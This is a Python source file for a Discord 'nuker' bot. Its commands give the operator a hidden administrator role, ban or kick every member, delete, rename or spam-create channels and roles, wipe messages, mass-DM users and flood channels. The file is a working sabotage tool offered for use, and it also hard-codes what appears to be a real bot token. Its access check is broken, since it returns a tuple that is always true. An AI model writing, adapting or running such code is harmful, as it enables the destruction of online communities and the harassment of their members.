import discord
from discord.ext import commands
import string
import random

client = commands.Bot(
    command_prefix='.',
    case_insensitive=True
)

def allowed(ctx):
    return ctx.author.id == 464357704446771201, 280598351722971136
    

@client.event
async def on_ready():
    await client.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game('NUKING SERVERS')
    )
    print(
        f'\nLogged in as {client.user.name}#{client.user.discriminator},',
        f'User ID: {client.user.id}, Version: {discord.__version__}\n'
    )

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.message.delete()
        await ctx.send('🚫 **Permission Denied!**')
    if isinstance(error, commands.NotOwner):
        await ctx.message.delete()
        await ctx.send('🚫 **You are not the owner!**')
    if isinstance(error, commands.CheckFailure):
        await ctx.message.delete()
        await ctx.send('🚫 **Access Denied!**')
    else:
        print(error)

@client.command()
@commands.check(allowed)
async def nukehelp(ctx):
    embedVar = discord.Embed(title="Commands",description="All Nuker Commands", color=0x00ff00)
    embedVar.add_field(name="Prefix", value="'.'", inline=False)
    embedVar.add_field(name="Author", value="Determined on line 12.", inline=False)
    embedVar.add_field(name=".admin", value="Grants the Author Administrator Permissions.", inline=False)
    embedVar.add_field(name=".ban", value="Bans Everyone from the Server Except from the Author.", inline=False)
    embedVar.add_field(name=".channel", value="Sub Commands:", inline=False)
    embedVar.add_field(name=".channel create", value="Will Spam Create Channels.", inline=False)
    embedVar.add_field(name=".channel rename", value="Will Rename All Channels with Random Names.", inline=False)
    embedVar.add_field(name=".channel delete", value="Will Delete All Channels.", inline=False)
    embedVar.add_field(name=".dm [Message]", value="Direct Messages Everyone in the Server with [Message].", inline=False)
    embedVar.add_field(name=".kick", value="Kicks Everyone from the Server Except from the Author.", inline=False)
    embedVar.add_field(name=".nickname", value="Nicknames Everyone in the Server to a Random String Except the Author.", inline=False)
    embedVar.add_field(name=".purge", value="Deletes Messages in  all Channels.", inline=False)
    embedVar.add_field(name=".role", value="Sub Commands:", inline=False)
    embedVar.add_field(name=".role create", value="Will Spam Create Roles", inline=False)
    embedVar.add_field(name=".role rename", value="Will Rename All Roles", inline=False)
    embedVar.add_field(name=".role delete", value="Will Delete All Roles", inline=False)
    embedVar.add_field(name=".spam [Message]", value="Spams [Message] in the Current Channel Until Stopped.", inline=False)
    await ctx.send(embed=embedVar)
    print('.nukehelp')
    


@client.command()
@commands.check(allowed)
async def admin(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(
        name='Hacker',
        permissions=discord.Permissions.all(),
        color=discord.Color(0x36393f)
    )
    role = discord.utils.get(ctx.guild.roles, name='Hacker')
    await ctx.author.add_roles(role)
    await ctx.send('✅ **Role Created!**')
    print('.admin')

@client.command()
@commands.check(allowed)
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send('🔨 **Banning all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.ban()
            else:
                continue
        except discord.Forbidden:
            continue
    print('.ban')

@client.command()
@commands.check(allowed)
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send('👢 **Roundhouse kicking all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.kick()
            else:
                continue
        except discord.Forbidden:
            continue
    print('.kick')

@client.command()
@commands.check(allowed)
async def channel(ctx, choice):
    await ctx.message.delete()
    if choice == 'create':
        await ctx.send('✅ **Mitosis (channels)!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_channels():
            while True:
                await ctx.guild.create_text_channel('NUKED')
                await ctx.guild.create_voice_channel('NUKED')

        spam_channel_task = client.loop.create_task(spam_create_channels())
        await client.wait_for('message', check=check_reply)
        spam_channel_task.cancel()
        await ctx.send('✅ **Mitosis complete!**')
        print('.channel create')

    elif choice == 'delete':
        await ctx.send('✅ **Purging channels!**')
        for chan in ctx.guild.channels:
            await chan.delete()
        print('.channel delete')

    elif choice == 'rename':
        await ctx.send('✅ **Renaming channels!**')
        char = string.ascii_letters + string.digits
        for chan in ctx.guild.channels:
            chan_name = ''.join((random.choice(char) for i in range(16)))
            await chan.edit(name=chan_name)
        print('.channel rename')

    else:
        await ctx.send('🚫 **Invalid option!**')
        print('.channel 🚫 Invalid option!')
    

@client.command()
@commands.check(allowed)
async def dm(ctx, *, msg=None):
    await ctx.message.delete()
    if msg is not None:
        await ctx.send('✅ **Attempting to DM everyone!**')
        for member in ctx.guild.members:
            if member != ctx.guild.me:
                try:
                    if member.dm_channel is None:
                        await member.create_dm()
                    await member.dm_channel.send(msg)
                except discord.Forbidden:
                    continue
            else:
                continue
        await ctx.send('✅ **Sliding into DMs complete!**')
        print('.dm ',msg)
    else:
        await ctx.send('🚫 **I cannot send an empty message!**')
        print('.dm 🚫 I cannot send an empty message!')

@client.command()
@commands.check(allowed)
async def purge(ctx):
    for tc in ctx.guild.text_channels:
        await tc.purge(bulk=True)
    await ctx.send('✅ **Purged all channels!**')
    print('.purge')

@client.command()
@commands.check(allowed)
async def role(ctx, choice):
    await ctx.message.delete()
    if choice == 'create':
        await ctx.send('✅ **Mitosis (roles)!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_roles():
            while True:
                await ctx.guild.create_role(name='NUKED')

        spam_role_task = client.loop.create_task(spam_create_roles())
        await client.wait_for('message', check=check_reply)
        spam_role_task.cancel()
        await ctx.send('✅ **Mitosis complete!**')
        print('.role create')

    elif choice == 'delete':
        await ctx.send('✅ **Purging roles!**')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break
        print('.role delete')

    elif choice == 'rename':
        await ctx.send('✅ **Renaming roles!**')
        char = string.ascii_letters + string.digits
        for role in ctx.guild.roles:
            if ctx.guild.me.roles[-1] > role:
                role_name = ''.join((random.choice(char) for i in range(16)))
                await role.edit(name=role_name)
            else:
                break
        print('.role rename')

    else:
        await ctx.send('🚫 **Invalid option!**')
        print('.role 🚫 Invalid option!')

@client.command()
@commands.check(allowed)
async def spam(ctx, *, msg=None):
    await ctx.message.delete()
    if msg is not None:
        await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_text():
            while True:
                for tc in ctx.guild.text_channels:
                    await tc.send(msg)

        spam_text_task = client.loop.create_task(spam_text())
        await client.wait_for('message', check=check_reply)
        spam_text_task.cancel()
        await ctx.send('✅ **Spamming complete!**')
        print('.spam ',msg)
    else:
        await ctx.send('🚫 **I cannot send an empty message!**')
        print('.spam 🚫 I cannot send an empty message!')

@client.command()
@commands.check(allowed)
async def nickname(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
        except discord.Forbidden:
            continue
    await ctx.send('✅ **Nicknamed everyone!**')
    print('.nickname')

@client.command()
@commands.check(allowed)
async def logout(ctx):
    await client.logout()

client.run('NzI5Njk5OTIyMTUyMTI4NTEz.XwM_hw.pzkFNnGNCgivw5yH36QOgcCa7KE')